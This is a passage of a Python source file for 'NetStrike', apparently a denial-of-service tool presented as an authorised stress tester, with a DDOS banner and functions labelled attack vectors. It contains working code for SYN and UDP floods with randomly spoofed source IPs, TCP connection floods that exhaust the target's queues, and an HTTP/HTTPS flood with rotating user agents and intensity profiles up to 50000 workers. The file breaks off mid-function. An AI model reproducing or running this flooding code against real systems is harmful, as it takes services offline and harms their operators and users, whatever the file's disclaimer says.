#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
NetStrike — 交互式高并发网络压力测试工具 (Linux 服务器专用)
仅限已获书面授权的目标使用。
依赖: Python 3.8+ 标准库, 无需 pip install
"""

from __future__ import annotations
import errno
import os
import random
import signal
import socket
import ssl
import struct
import sys
import threading
import time
from multiprocessing import Process, Queue

# 单调时钟: 压测计时必须用 monotonic, 否则 NTP 校时或手动改时间会让
# 已运行时长突变, 导致提前结束或统计速率失真
now = time.monotonic

# ============================================================
# 常量
# ============================================================
PROFILES = {
    "1": ("light",   100,   32,  1024),
    "2": ("normal",  1000,  64,  1400),
    "3": ("heavy",   5000, 128,  1400),
    "4": ("extreme", 20000, 256, 1400),
    "5": ("insane",  50000, 512,  1400),
}
PROF_DESC = {
    "light":   "低强度  (~1万 pps, 适合小带宽靶机验证)",
    "normal":  "标准档  (~10万 pps, 常规压测)",
    "heavy":   "高强度  (~50万 pps, 中型服务)",
    "extreme": "极高    (~200万 pps, 需要 >=10Gbps 出口)",
    "insane":  "极限    (50000并发, 会打满本机, 仅限千兆专线靶场)",
}
UA_POOL = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:126.0) Gecko/20100101 Firefox/126.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148 Safari/604.1",
    "curl/8.5.0",
    "python-requests/2.32.3",
]
BANNER = r"""

██████╗ ██████╗  ██████╗ ███████╗
██╔══██╗██╔══██╗██╔═══██╗██╔════╝
██║  ██║██║  ██║██║   ██║███████╗
██║  ██║██║  ██║██║   ██║╚════██║
██████╔╝██████╔╝╚██████╔╝███████║
╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝
                                                                                  
"""


# ============================================================
# 平台抽象 (Linux / Windows 双兼容)
# ============================================================
IS_WIN = sys.platform.startswith("win")
IS_LINUX = sys.platform.startswith("linux")
IS_MAC = sys.platform == "darwin"

# Windows 控制台默认不支持 ANSI 转义, 需显式开启 VT 处理
USE_ANSI = True


def setup_console():
    """控制台初始化: 统一 UTF-8 输出 + Windows 开启 ANSI VT 序列
    返回 True 表示可以使用 \\033[2K 之类的光标控制序列
    """
    global USE_ANSI
    # 中文输出在 Windows 默认 GBK 控制台下会 UnicodeEncodeError
    for stream in (sys.stdout, sys.stderr):
        try:
            stream.reconfigure(encoding="utf-8", errors="replace")
        except Exception:
            pass

    if not IS_WIN:
        USE_ANSI = True
        return True

    try:
        import ctypes
        kernel32 = ctypes.windll.kernel32
        handle = kernel32.GetStdHandle(-11)   # STD_OUTPUT_HANDLE
        mode = ctypes.c_uint32()
        if not kernel32.GetConsoleMode(handle, ctypes.byref(mode)):
            USE_ANSI = False
            return False
        # ENABLE_VIRTUAL_TERMINAL_PROCESSING = 0x0004
        if not kernel32.SetConsoleMode(handle, mode.value | 0x0004):
            USE_ANSI = False
            return False
        USE_ANSI = True
        return True
    except Exception:
        USE_ANSI = False
        return False


def clear_line_prefix() -> str:
    """进度行清屏序列; 终端不支持 ANSI 时退化为回车覆盖"""
    return "\033[2K\r" if USE_ANSI else "\r"


def is_root() -> bool:
    """Windows 下判断是否管理员; POSIX 下判断 euid==0"""
    if IS_WIN:
        try:
            import ctypes
            return bool(ctypes.windll.shell32.IsUserAnAdmin())
        except Exception:
            return False
    return hasattr(os, "geteuid") and os.geteuid() == 0


def make_raw_socket():
    """创建可自行构造 IP 头的原始套接字。

    Linux : SOCK_RAW + IPPROTO_RAW 即可
    Windows: IPPROTO_RAW 不被支持, 必须用 IPPROTO_IP 再开 IP_HDRINCL
             且需要管理员权限
    """
    if IS_WIN:
        s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_IP)
        s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        return s
    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
    s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
    return s


def hr(title: str = "", width: int = 64) -> str:
    if not title:
        return "-" * width
    return ("-- %s " % title).ljust(width, "-")


def ask(prompt: str, default: str = "") -> str:
    try:
        v = input("  %s [%s] > " % (prompt, default)).strip()
    except EOFError:
        v = ""
    except KeyboardInterrupt:
        raise
    return v or default


def ask_int(prompt: str, default: int, maximum: int = 0,
            allow_zero: bool = False) -> int:
    """带重试上限的整数输入。

    allow_zero=True 时 0 是合法值 (常用于 "0 = 不修改" 这类语义),
    否则 0 视为非法并提示重新输入。
    非法输入重试 MAX_ATTEMPTS 次后回退默认值, 避免交互脚本卡死。
    """
    MAX_ATTEMPTS = 5
    low = 0 if allow_zero else 1
    for _ in range(MAX_ATTEMPTS):
        v = ask(prompt, str(default))
        try:
            n = int(v)
        except ValueError:
            print("  ! 请输入整数")
            continue
        if n < low:
            print("  ! 请输入%s整数" % ("非负" if allow_zero else "正"))
            continue
        if maximum and n > maximum:
            print("  ! 超出允许上限 %d, 已自动修正" % maximum)
            n = maximum
        return n
    print("  ! 连续 %d 次输入无效, 使用默认值 %d" % (MAX_ATTEMPTS, default))
    return default


def ask_yn(prompt: str, default: bool = False) -> bool:
    v = ask(prompt, "Y" if default else "N").lower()
    return v in ("y", "yes")


def checksum(data: bytes) -> int:
    if len(data) % 2:
        data += b"\x00"
    s = sum(struct.unpack("!%dH" % (len(data) // 2), data))
    s = (s >> 16) + (s & 0xFFFF)
    s += s >> 16
    return (~s) & 0xFFFF


def rand_ip() -> str:
    return ("%d.%d.%d.%d" % (random.randint(1, 223), random.randint(0, 255),
                             random.randint(0, 255), random.randint(1, 254)))


def local_ip() -> str:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("10.255.255.255", 1))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        return "127.0.0.1"


# ============================================================
# fd / 端口 / 错误诊断
# ============================================================
def fd_limit() -> int:
    """当前进程可打开的 fd 上限。
    Windows 没有 ulimit 概念 (句柄上限远高于实用范围), 返回 0 表示"不受限"。
    """
    if IS_WIN:
        return 0
    try:
        import resource
        soft, _ = resource.getrlimit(resource.RLIMIT_NOFILE)
        return int(soft)
    except Exception:
        try:
            import subprocess
            out = subprocess.check_output(["sh", "-c", "ulimit -n"])
            return int(out.decode().strip())
        except Exception:
            return 0


def fd_limit_hard() -> int:
    if IS_WIN:
        return 0
    try:
        import resource
        _, hard = resource.getrlimit(resource.RLIMIT_NOFILE)
        if hard == resource.RLIM_INFINITY:
            return 1 << 20
        return int(hard)
    except Exception:
        return 0


def try_raise_fd(desired: int = 1 << 20) -> bool:
    """尝试把软 fd 上限提到硬上限。成功返回 True。
    这一步很关键: 很多系统 soft=1024 但 hard=1048576, 无需改 limits.conf 就能提。
    """
    if IS_WIN:
        return False
    try:
        import resource
        soft, hard = resource.getrlimit(resource.RLIMIT_NOFILE)
        target = desired if hard == resource.RLIM_INFINITY else min(desired, hard)
        if target <= soft:
            return False
        resource.setrlimit(resource.RLIMIT_NOFILE, (target, hard))
        return True
    except Exception:
        return False


def ephem_port_range() -> int:
    """本机可用临时端口数量, 决定单位时间能发起多少条新连接"""
    if IS_WIN:
        try:
            import subprocess
            out = subprocess.check_output(
                ["netsh", "int", "ipv4", "show", "dynamicport", "tcp"],
                stderr=subprocess.DEVNULL, timeout=5)
            start = number = 0
            for line in out.decode("gbk", "ignore").splitlines():
                if "起始端口" in line or "Start Port" in line:
                    start = int(line.split(":")[-1].strip())
                elif "端口数" in line or "Number of Ports" in line:
                    number = int(line.split(":")[-1].strip())
            return max(0, number)
        except Exception:
            return 0
    try:
        with open("/proc/sys/net/ipv4/ip_local_port_range") as f:
            lo, hi = f.read().split()
            return max(0, int(hi) - int(lo))
    except Exception:
        return 0


def classify_err(e) -> str:
    """把异常归类, 区分本地资源耗尽 vs 目标拒绝"""
    name = type(e).__name__
    if name in ("TimeoutError", "Timeout"):
        return "timeout"
    if isinstance(e, ssl.SSLError):
        return "tls"
    # 先按异常类型判定 (asyncio 抛出的这类异常经常不带 errno)
    if isinstance(e, ConnectionResetError):
        return "reset"
    if isinstance(e, ConnectionRefusedError):
        return "refused"
    if isinstance(e, ConnectionAbortedError):
        return "reset"
    if isinstance(e, socket.gaierror):
        return "dns"
    if isinstance(e, OSError):
        en = getattr(e, "errno", None) or 0
        if en in (errno.EMFILE, getattr(errno, "ENFILE", 24)):
            return "fd_exhausted"
        if en == getattr(errno, "EADDRNOTAVAIL", 99):
            return "port_exhausted"
        if en in (errno.ECONNRESET,):
            return "reset"
        if en in (errno.ECONNREFUSED,):
            return "refused"
        if en in (errno.ETIMEDOUT,):
            return "timeout"
        if en is not None and en > 0:
            return "os_err_%d" % en
    return "other"


def _win_rx_bytes(only_index: int = 0) -> int:
    """Windows 下用 iphlpapi.GetIfTable 汇总网卡收包字节。

    MIB_IFROW 布局 (x86/x64 均为 4 字节对齐, 总长 860 字节):
        0   .. 511  wszName[256]
        512        dwIndex
        ...
        552        dwInOctets   <- 我们需要的字段

    only_index 非 0 时只统计该索引的网卡, 避免把 Hyper-V/WSL/Docker
    虚拟网卡的流量算进来。
    """
    try:
        import ctypes
        from ctypes import wintypes

        iphlpapi = ctypes.WinDLL("iphlpapi.dll")
        size = wintypes.DWORD(0)
        iphlpapi.GetIfTable(None, ctypes.byref(size), False)
        if size.value <= 0:
            return 0
        buf = ctypes.create_string_buffer(size.value)
        if iphlpapi.GetIfTable(buf, ctypes.byref(size), False) != 0:
            return 0
        data = buf.raw
        num = int.from_bytes(data[0:4], "little")
        ROW = 860
        total = 0
        for i in range(num):
            off = 4 + i * ROW
            if off + ROW > len(data):
                break
            idx = int.from_bytes(data[off + 512:off + 516], "little")
            if only_index and idx != only_index:
                continue
            total += int.from_bytes(data[off + 552:off + 556], "little")
        return total
    except Exception:
        return 0


def _linux_default_iface() -> str:
    """从 /proc/net/route 找出默认路由的网卡名 (Destination=0 且 Metric 最小)"""
    best = None
    try:
        with open("/proc/net/route") as f:
            next(f)  # 表头
            for line in f:
                parts = line.split()
                if len(parts) < 8:
                    continue
                iface, dest, _gw, _flags, _ref, _use, metric, mask = parts[:8]
                if dest != "00000000" or mask != "00000000":
                    continue
                m = int(metric)
                if best is None or m < best[0]:
                    best = (m, iface)
    except Exception:
        return ""
    return best[1] if best else ""


def _linux_iface_rx(iface: str) -> int:
    try:
        with open("/proc/net/dev") as f:
            for line in f.readlines()[2:]:
                name, _, rest = line.partition(":")
                if name.strip() != iface:
                    continue
                parts = rest.split()
                if len(parts) >= 9:
                    return int(parts[0])
    except Exception:
        pass
    return 0


def _win_default_iface_index() -> int:
    """用 GetBestInterface 找出访问公网时实际使用的网卡索引"""
    try:
        import ctypes
        from ctypes import wintypes
        iphlpapi = ctypes.WinDLL("iphlpapi.dll")
        # 8.8.8.8 只用来问路由, 不会真的发流量
        dest = struct.unpack("!I", socket.inet_aton("8.8.8.8"))[0]
        idx = wintypes.DWORD(0)
        if iphlpapi.GetBestInterface(wintypes.DWORD(dest), ctypes.byref(idx)) == 0:
            return int(idx.value)
    except Exception:
        pass
    return 0


def iface_rx_bytes() -> int:
    """统计本机收包总量(字节)。

    优先只统计"通往目标的那块网卡": 在 Docker/多网卡环境里,
    docker0、br-*、veth 的流量会把"回收 Mbps"算得虚高。
    找不到默认路由时退回全量统计。

    注意: Windows 计数器是 32 位, 会在 4GiB 处回绕, 调用方需处理负增量。
    """
    if IS_WIN:
        idx = _win_default_iface_index()
        if idx:
            v = _win_rx_bytes(only_index=idx)
            if v:
                return v
        return _win_rx_bytes()
    iface = _linux_default_iface()
    if iface:
        v = _linux_iface_rx(iface)
        if v:
            return v
    total = 0
    try:
        with open("/proc/net/dev") as f:
            for line in f.readlines()[2:]:
                name, _, rest = line.partition(":")
                if name.strip() == "lo":
                    continue
                parts = rest.split()
                if len(parts) >= 9:
                    total += int(parts[0])
    except Exception:
        pass
    return total


def rx_delta(cur: int, prev: int) -> int:
    """处理 32 位计数器回绕的增量计算"""
    d = cur - prev
    if d < 0:
        d += 1 << 32
    return max(0, d)


# ============================================================
# URL 解析 / TLS 配置
# ============================================================
def parse_target(raw: str):
    """解析目标, 返回 (host, port, scheme, paths)
    支持:
      example.com
      example.com:8443
      https://example.com/path
      https://example.com:8443/a,/b
    """
    raw = raw.strip()
    scheme = ""
    if "://" in raw:
        scheme, raw = raw.split("://", 1)
        scheme = scheme.lower()
        if scheme not in ("http", "https"):
            scheme = ""
    paths = []
    if "/" in raw:
        head, tail = raw.split("/", 1)
        paths = ["/" + tail]
        raw = head
    else:
        paths = ["/"]
    port = None
    if ":" in raw:
        host, p = raw.rsplit(":", 1)
        if p.isdigit():
            port = int(p)
            raw = host
    host = raw or "127.0.0.1"
    return host, port, scheme, paths


def build_ssl_context(verify: bool, tls_version: str, alpn, cipher: str):
    """构建 TLS 上下文
    tls_version: "" | "1.2" | "1.3"
    alpn: list[str] 或 None
    cipher: OpenSSL cipher string, 空则用默认
    """
    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    if verify:
        ctx.verify_mode = ssl.CERT_REQUIRED
        ctx.check_hostname = True
        try:
            ctx.load_default_certs(ssl.Purpose.SERVER_AUTH)
        except Exception:
            pass
    else:
        # 压测自签/过期证书的靶机, 关闭校验
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
    if tls_version == "1.2":
        ctx.minimum_version = ssl.TLSVersion.TLSv1_2
        ctx.maximum_version = ssl.TLSVersion.TLSv1_2
    elif tls_version == "1.3":
        ctx.minimum_version = ssl.TLSVersion.TLSv1_3
        ctx.maximum_version = ssl.TLSVersion.TLSv1_3
    if alpn:
        try:
            ctx.set_alpn_protocols(alpn)
        except Exception:
            pass
    if cipher:
        try:
            ctx.set_ciphers(cipher)
        except Exception:
            pass
    return ctx


# ============================================================
# 原始包构造
# ============================================================
def build_ip(src: str, dst: str, proto: int, payload_len: int) -> bytes:
    ident = random.randint(0, 65535)
    h = struct.pack("!BBHHHBBH4s4s", 0x45, 0, 20 + payload_len, ident, 0, 64,
                    proto, 0, socket.inet_aton(src), socket.inet_aton(dst))
    ck = checksum(h)
    return struct.pack("!BBHHHBBH4s4s", 0x45, 0, 20 + payload_len, ident, 0, 64,
                       proto, ck, socket.inet_aton(src), socket.inet_aton(dst))


def build_tcp_syn(src: str, dst: str, sport: int, dport: int, seq: int) -> bytes:
    hdr = struct.pack("!HHIIBBHHH", sport, dport, seq, 0, 5 << 4, 0x02, 65535, 0, 0)
    pseudo = (socket.inet_aton(src) + socket.inet_aton(dst)
              + struct.pack("!BBH", 0, 6, 20))
    ck = checksum(pseudo + hdr)
    hdr = struct.pack("!HHIIBBHHH", sport, dport, seq, 0, 5 << 4, 0x02, 65535, ck, 0)
    return hdr


def build_udp(src: str, dst: str, sport: int, dport: int, payload: bytes) -> bytes:
    ln = 8 + len(payload)
    pseudo = (socket.inet_aton(src) + socket.inet_aton(dst)
              + struct.pack("!BBH", 0, 17, ln))
    ck = checksum(pseudo + struct.pack("!HHHH", sport, dport, ln, 0) + payload) or 0xFFFF
    return struct.pack("!HHHH", sport, dport, ln, ck) + payload


def resolve_host(host: str, port: int) -> str:
    """解析域名 -> IP, 失败则原样返回
    压测时把 IP 缓存下来, 避免每次连接都走 DNS 解析线程池
    """
    try:
        infos = socket.getaddrinfo(host, port, proto=socket.IPPROTO_TCP)
        for fam, _t, _p, _c, sockaddr in infos:
            if fam == socket.AF_INET:
                return sockaddr[0]
    except Exception:
        pass
    return host


def preflight(host: str, port: int, use_tls: bool, ssl_ctx=None, sni=None):
    """启动前连通性自检, 返回 (是否通过, 说明)"""
    t0 = now()
    try:
        ip = resolve_host(host, port)
    except Exception as e:
        return False, "DNS 解析失败: %s" % e
    try:
        s = socket.create_connection((ip, port), timeout=5)
    except Exception as e:
        return False, "TCP 连接失败 (%s:%d) : %s" % (host, port, e)
    rtt = (now() - t0) * 1000
    try:
        if use_tls:
            ctx = ssl_ctx or ssl.create_default_context()
            w = ctx.wrap_socket(s, server_hostname=sni or host)
            ver = w.version()
            cipher = w.cipher()
            w.close()
            return True, "TCP+TLS 握手成功  RTT=%.1fms  %s %s" % (
                rtt, ver, cipher[0] if cipher else "-")
        s.close()
        return True, "TCP 连接成功  RTT=%.1fms" % rtt
    except Exception as e:
        try:
            s.close()
        except Exception:
            pass
        return False, "TLS 握手失败: %s" % e


def preflight_udp(host: str, port: int, timeout: float = 3.0):
    """UDP 连通性自检。DNS 服务器通常只开 UDP/53,
    用 TCP 探测会误报失败, 所以单独走 UDP + 真实 DNS 查询。
    返回 (是否通过, 说明)
    """
    t0 = now()
    try:
        ip = resolve_host(host, port)
    except Exception as e:
        return False, "地址解析失败: %s" % e
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.settimeout(timeout)
    except Exception as e:
        return False, "UDP socket 创建失败: %s" % e
    try:
        pkt, tid = build_dns_query()
        try:
            s.sendto(pkt, (ip, port))
        except Exception as e:
            return False, "UDP 发送失败 (%s:%d): %s" % (host, port, e)
        # DNS 无响应是常态 (可能被过滤), 发送成功即视为链路可达
        try:
            data = s.recv(4096)
            rtt = (now() - t0) * 1000
            if len(data) >= 12:
                if struct.unpack("!H", data[:2])[0] == tid:
                    return True, "DNS 查询得到应答  RTT=%.1fms  %d 字节" % (
                        rtt, len(data))
                return True, "收到 UDP 应答 (事务ID不匹配) %d 字节" % len(data)
            return True, "收到 %d 字节应答" % len(data)
        except socket.timeout:
            return True, ("UDP 已发出但 %.0fs 内无应答 "
                          "(可能只做过滤, 压测仍可进行)" % timeout)
        except OSError as e:
            # Windows 上收到 ICMP 端口不可达会以 ECONNRESET 形式抛出,
            # 这说明端口确实没开, 属于真实失败而非探测方法的问题。
            en = getattr(e, "errno", None)
            if en in (errno.ECONNRESET, errno.ECONNREFUSED):
                return False, "UDP 端口不可达 (收到 ICMP 不可达, 端口未开放)"
            return False, "UDP 接收失败: %s" % e
    finally:
        try:
            s.close()
        except Exception:
            pass


# ============================================================
# 统计
# ============================================================
class Stats:
    def __init__(self):
        self.pkts = 0
        self.bytes = 0      # 发出字节
        self.rbytes = 0     # 收到字节
        self.errs = 0
        self.conns = 0
        self.attempts = 0   # 建连尝试次数
        self.tls_ok = 0
        self.tls_fail = 0
        self.kinds = {}     # 错误分类计数
        self.lock = threading.Lock()

    def add(self, pkts=0, nbytes=0, errs=0, conns=0, tls_ok=0, tls_fail=0,
            rbytes=0, attempts=0, kind=None):
        with self.lock:
            self.pkts += pkts
            self.bytes += nbytes
            self.rbytes += rbytes
            self.errs += errs
            self.conns += conns
            self.attempts += attempts
            self.tls_ok += tls_ok
            self.tls_fail += tls_fail
            if kind:
                self.kinds[kind] = self.kinds.get(kind, 0) + 1

    def snapshot(self):
        with self.lock:
            return (self.pkts, self.bytes, self.rbytes, self.errs, self.conns,
                    self.attempts, self.tls_ok, self.tls_fail, dict(self.kinds))


# ============================================================
# 攻击向量
# ============================================================
def vec_syn(target, port, duration, workers, size, spoof, stats):
    """原始 SYN 洪水 — 灌满目标 SYN 队列形成半连接"""
    stop = threading.Event()
    end = now() + duration
    lip = local_ip()

    def run():
        try:
            s = make_raw_socket()
        except OSError as e:
            stats.add(errs=1)
            msg = "  ! RAW socket 创建失败: %s" % e
            if IS_WIN:
                msg += "\n    Windows 需要以管理员身份运行, 且系统限制原始 TCP 发包"
            else:
                msg += "\n    Linux 需要 root 或 CAP_NET_RAW 权限"
            print(msg)
            return
        pad = b"\x00" * max(0, size - 40)
        while not stop.is_set() and now() < end:
            batch = []
            for _ in range(64):
                src = rand_ip() if spoof else lip
                iph = build_ip(src, target, 6, 20 + len(pad))
                tcph = build_tcp_syn(src, target, random.randint(1024, 65535),
                                     port, random.getrandbits(32))
                batch.append(iph + tcph + pad)
            try:
                for p in batch:
                    s.sendto(p, (target, port))
                stats.add(pkts=len(batch), nbytes=len(batch) * (40 + len(pad)))
            except OSError:
                stats.add(errs=1)
                time.sleep(0.05)
        s.close()

    ts = [threading.Thread(target=run, daemon=True) for _ in range(workers)]
    for t in ts:
        t.start()
    for t in ts:
        t.join()


def vec_udp(target, port, duration, workers, size, spoof, stats):
    """UDP 洪水 — 带宽/报文队列淹没"""
    stop = threading.Event()
    end = now() + duration
    # 本机出口 IP 只解析一次。放在热循环里会每包建一次 socket,
    # 48 包的批次就是 48 次 connect/getsockname, 直接把发包率拖垮。
    lip = local_ip()

    def run():
        # 先判断平台限制, 再建套接字。否则 Windows + spoof 时
        # 会先创建 raw socket 再抛异常, 导致句柄泄漏。
        want_raw = not (spoof and IS_WIN)
        if not want_raw:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            raw = False
        else:
            try:
                s = make_raw_socket()
                raw = True
            except OSError:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                raw = False
        payload = os.urandom(max(1, size))
        while not stop.is_set() and now() < end:
            try:
                if raw:
                    for _ in range(48):
                        src = rand_ip() if spoof else lip
                        pkt = (build_ip(src, target, 17, 8 + len(payload))
                               + build_udp(src, target, random.randint(1024, 65535),
                                           port, payload))
                        s.sendto(pkt, (target, port))
                    stats.add(pkts=48, nbytes=48 * (28 + len(payload)))
                else:
                    for _ in range(48):
                        s.sendto(payload, (target, port))
                    stats.add(pkts=48, nbytes=48 * len(payload))
            except OSError:
                stats.add(errs=1)
                time.sleep(0.05)
        s.close()

    ts = [threading.Thread(target=run, daemon=True) for _ in range(workers)]
    for t in ts:
        t.start()
    for t in ts:
        t.join()


def vec_tcp(target, port, duration, workers, size, spoof, stats):
    """TCP 连接洪水 — 耗尽 accept 队列与 fd 表"""
    stop = threading.Event()
    end = now() + duration
    payload = os.urandom(max(1, size))

    def run():
        while not stop.is_set() and now() < end:
            # 每次循环都是一次建连尝试, 必须计数, 否则报告里
            # "建连尝试: 0 / 成功连接: N" 看起来像 bug
            stats.add(attempts=1)
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(0.8)
                s.connect((target, port))
                stats.add(conns=1)
                if size:
                    s.sendall(payload)
                time.sleep(random.uniform(0.05, 0.3))
                s.close()
            except OSError as e:
                stats.add(errs=1, kind=classify_err(e))

    ts = [threading.Thread(target=run, daemon=True) for _ in range(workers)]
    for t in ts:
        t.start()
    for t in ts:
        t.join()


def vec_http(target, port, duration, workers, size, spoof, stats, method, paths,
             use_tls=False, ssl_ctx=None, host_header=None, sni=None,
             reuse=True, cfg_hs_limit=2000, conn_timeout=8,
             resp_timeout=5.0, wait_response=True, reuse_jitter=0.01):
    """HTTP / HTTPS 洪水 — asyncio keep-alive 长连接 + 随机 UA/路径
    use_tls      : 是否启用 TLS (HTTPS)
    reuse        : True=连接复用; False=每请求新建连接 (测握手/建连能力)
    conn_timeout : 建连/握手超时秒数, 超过即判失败并回收槽位
    resp_timeout : 单条响应等待上限; 超时视为目标变慢, 触发重连
    wait_response: True=严格等完整响应(数据可信); False=发射后不管(纯压带宽)
    """
    import asyncio

    def _quiet_exc(loop, context):
        """屏蔽对端 RST 产生的无害回调噪音, 其余异常照常上报。

        Windows Proactor 在连接被重置时会于 connection_lost 里抛
        ConnectionResetError, 这属于正常现象, 不应该刷屏干扰统计面板。
        """
        exc = context.get("exception")
        if isinstance(exc, (ConnectionResetError, ConnectionAbortedError,
                            BrokenPipeError)):
            return
        if isinstance(exc, OSError) and getattr(exc, "errno", None) in (
                10053, 10054, 104, 32):
            return
        loop.default_exception_handler(context)

    async def main():
        try:
            asyncio.get_running_loop().set_exception_handler(_quiet_exc)
        except Exception:
            pass
        end = now() + duration
        hdr_host = host_header or target
        # 预解析域名: 避免每条连接都走 getaddrinfo 线程池 (默认仅 8 线程, 会成为瓶颈)
        try:
            ip = resolve_host(target, port)
        except Exception:
            ip = target

        # 握手并发闸门: 50000 条 TLS 握手同时打, 本机 CPU 会先炸
        hs_limit = max(64, min(workers, cfg_hs_limit))
        hs_sem = asyncio.Semaphore(hs_limit)
        # 注: 不再用 Semaphore(workers) 限流协程数 —— 协程总数本身就等于
        # workers, 这个信号量恒不阻塞, 属于纯开销。真正的并发上限由
        # 下方的 Task 数量直接决定, 并在建 Task 前做过量提示。
        # 分批启动, 避免一瞬间堆积过多待调度 Task。
        # 步长按并发规模自适应: 小并发一次拉完(短 duration 不至于爬升太慢),
        # 大并发分 ~20 批, 让前置连接先跑起来吸收启动尖峰。
        SPAWN_STEP = max(512, workers // 20)

        # POST/PUT 的请求体预生成一个小池子循环复用。
        # 每请求调 os.urandom 在 insane 档是纯 CPU 开销, 且完全没必要 ——
        # 压测关心的是字节量和速率, 不需要每次都不同。
        if method in ("POST", "PUT") and size > 0:
            pool_n = 8 if size <= 65536 else 2
            body_pool = [os.urandom(size) for _ in range(pool_n)]
        else:
            body_pool = []

        async def read_response(r, deadline):
            """读取一条完整 HTTP 响应, 防止半读导致 TCP 流错位。

            返回 (状态, 字节数) 状态:
              "ok"        - 完整读到一个响应
              "timeout"   - 超时 (目标变慢或被限流)
              "eof"       - 对端关闭
              "bad"       - 响应格式异常
            """
            buf = b""
            # ---- 读头部 ----
            while b"\r\n\r\n" not in buf:
                remain = deadline - now()
                if remain <= 0:
                    return "timeout", len(buf)
                try:
                    chunk = await asyncio.wait_for(r.read(4096), timeout=remain)
                except asyncio.TimeoutError:
                    return "timeout", len(buf)
                except (OSError, ssl.SSLError):
                    return "eof", len(buf)
                if not chunk:
                    return "eof", len(buf)
                buf += chunk
                if len(buf) > 65536:
                    return "bad", len(buf)
            head, _, rest = buf.partition(b"\r\n\r\n")
            total = len(buf)
            # ---- 解析报文长度 ----
            clen = -1
            chunked = False
            for line in head.split(b"\r\n")[1:]:
                if b":" not in line:
                    continue
                k, v = line.split(b":", 1)
                kl = k.strip().lower()
                if kl == b"content-length":
                    try:
                        clen = int(v.strip())
                    except ValueError:
                        clen = -1
                elif kl == b"transfer-encoding" and b"chunked" in v.lower():
                    chunked = True
            # ---- 读报文 ----
            if chunked:
                # 逐块解析: 读 "十六进制长度\r\n" + 数据 + "\r\n",
                # 遇到长度为 0 的块结束。不能用字节串搜索终止符,
                # 否则响应体里恰好含 "\r\n0\r\n\r\n" 时会提前收尾。
                body = bytearray(rest)
                pos = 0          # 已消费到 body 的位置
                while True:
                    # 找到当前块的尺寸行
                    while True:
                        nl = body.find(b"\r\n", pos)
                        if nl != -1:
                            break
                        remain = deadline - now()
                        if remain <= 0:
                            return "timeout", total
                        try:
                            chunk = await asyncio.wait_for(
                                r.read(4096), timeout=remain)
                        except asyncio.TimeoutError:
                            return "timeout", total
                        except (OSError, ssl.SSLError):
                            return "eof", total
                        if not chunk:
                            return "eof", total
                        body += chunk
                        total += len(chunk)
                        if len(body) > 4 * 1024 * 1024:
                            return "bad", total
                    size_line = bytes(body[pos:nl])
                    # 去掉 chunk extension (;name=value)
                    semi = size_line.find(b";")
                    if semi != -1:
                        size_line = size_line[:semi]
                    try:
                        csize = int(size_line.strip(), 16)
                    except ValueError:
                        return "bad", total
                    pos = nl + 2
                    if csize == 0:
                        # 末块: 后面可能跟 trailer, 读到空行即可
                        while True:
                            nl2 = body.find(b"\r\n", pos)
                            if nl2 == pos:
                                return "ok", total
                            if nl2 != -1:
                                pos = nl2 + 2
                                continue
                            remain = deadline - now()
                            if remain <= 0:
                                return "ok", total
                            try:
                                chunk = await asyncio.wait_for(
                                    r.read(4096), timeout=remain)
                            except (asyncio.TimeoutError, OSError, ssl.SSLError):
                                return "ok", total
                            if not chunk:
                                return "ok", total
                            body += chunk
                            total += len(chunk)
                    # 确保块数据 + 结尾 \r\n 都在缓冲里
                    while len(body) < pos + csize + 2:
                        remain = deadline - now()
                        if remain <= 0:
                            return "timeout", total
                        try:
                            chunk = await asyncio.wait_for(
                                r.read(4096), timeout=remain)
                        except asyncio.TimeoutError:
                            return "timeout", total
                        except (OSError, ssl.SSLError):
                            return "eof", total
                        if not chunk:
                            return "eof", total
                        body += chunk
                        total += len(chunk)
                        if len(body) > 4 * 1024 * 1024:
                            return "bad", total
                    pos += csize + 2
                    # 回收已消费的前缀, 避免缓冲无限增长
                    if pos > 65536:
                        del body[:pos]
                        pos = 0
            if clen >= 0:
                need = clen - len(rest)
                while need > 0:
                    remain = deadline - now()
                    if remain <= 0:
                        return "timeout", total
                    try:
                        chunk = await asyncio.wait_for(
                            r.read(min(need, 65536)), timeout=remain)
                    except asyncio.TimeoutError:
                        return "timeout", total
                    except (OSError, ssl.SSLError):
                        return "eof", total
                    if not chunk:
                        return "eof", total
                    need -= len(chunk)
                    total += len(chunk)
                return "ok", total
            # 没有长度信息: 只能按 EOF 判断, 或者读一次就返回
            return "ok", total

        async def one_request(r, w, ua=None, path=None):
            hdr = {
                "Host": hdr_host,
                "User-Agent": ua or random.choice(UA_POOL),
                "Accept": "*/*",
                "Accept-Language": "zh-CN,zh;q=0.9",
                "Accept-Encoding": "identity",
                "Cache-Control": "no-cache",
                "Connection": "keep-alive" if reuse else "close",
            }
            # 从预生成池里随机取, 避免每个请求都调 os.urandom —
            # insane 档 POST 大 body 时, 生成随机数会成为纯 CPU 瓶颈
            body = random.choice(body_pool) if body_pool else b""
            if body:
                hdr["Content-Type"] = "application/octet-stream"
                hdr["Content-Length"] = str(len(body))
            req = ("%s %s HTTP/1.1\r\n"
                   % (method, path or random.choice(paths))).encode()
            for k, v in hdr.items():
                req += ("%s: %s\r\n" % (k, v)).encode()
            req += b"\r\n" + body
            w.write(req)
            try:
